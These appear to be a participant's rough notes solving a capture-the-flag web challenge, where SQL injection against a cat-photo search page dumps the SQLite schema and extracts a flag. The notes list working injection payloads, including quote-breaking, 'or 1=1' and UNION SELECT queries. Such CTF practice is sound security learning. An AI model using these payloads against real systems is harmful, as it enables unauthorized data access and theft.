# Cat Viewer
> I built a little web site to search through my archive of cat photos. I hid
> a little something extra in the database too. See if you can find it!
> https://nessus-catviewer.chals.io/> 

https://nessus-catviewer.chals.io/index.php?cat=


## Notes
- The param `cat` can be left empty to show all cats.
- Cat Winston Tarver is a poem.
- 


- double quote gets a crash.

select * from cats where name="Sheldon"

paylod=Sheldon"
select * from cats where name="Sheldon""
> SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;&quot;&quot
> translated: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: '"'

paylod=Sheldon"/*
paylod=Sheldon"--
select * from cats where name="Sheldon"--"
> No crash but also no results

Sheldon"*
> Unable to prepare statement: 1, near "%": syntax error in /var/www/html/index.php on line 19


select * from cats where LIKE "%QUERY%"

`"--` gives all cats
`" and 1=0--` gives nothing as expected
`" intersect select sqlite_version() as name, 2--` gives nothing as expected
`" intersect select sql as name from sqlite_schema-` gives nothing as expected
" intersect select sqlite_version() as Name, 2, 3, 4--

`NOTHING" union all select 1, 'Img', 'Name', 4 "--` gives us exfil on img/name fields

`NOTHING" union all select 1, 'Img', (select sql from sqlite_schema), 4 "--` GET SCHEMA

```
CREATE TABLE cats (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    image TEXT NOT NULL,
    name TEXT NOT NULL,
    flag TEXT NOT NULL
```

`NOTHING" union all select * from cats where flag IS NOT NULL"--` GET SCHEMA

`NOTHING" union all select 1, 2, flag, 4 from cats where flag != ''--`
> Name: flag{a_sea_of_cats}


Model: id, image, name, idk


select * from cats where LIKE "%" intersect --%"




select * from cats where LIKE "%don%"--%"

Double:
select * from cats where name="Sheldon"""

select * from cats where name="Sheldon" or 1=1--
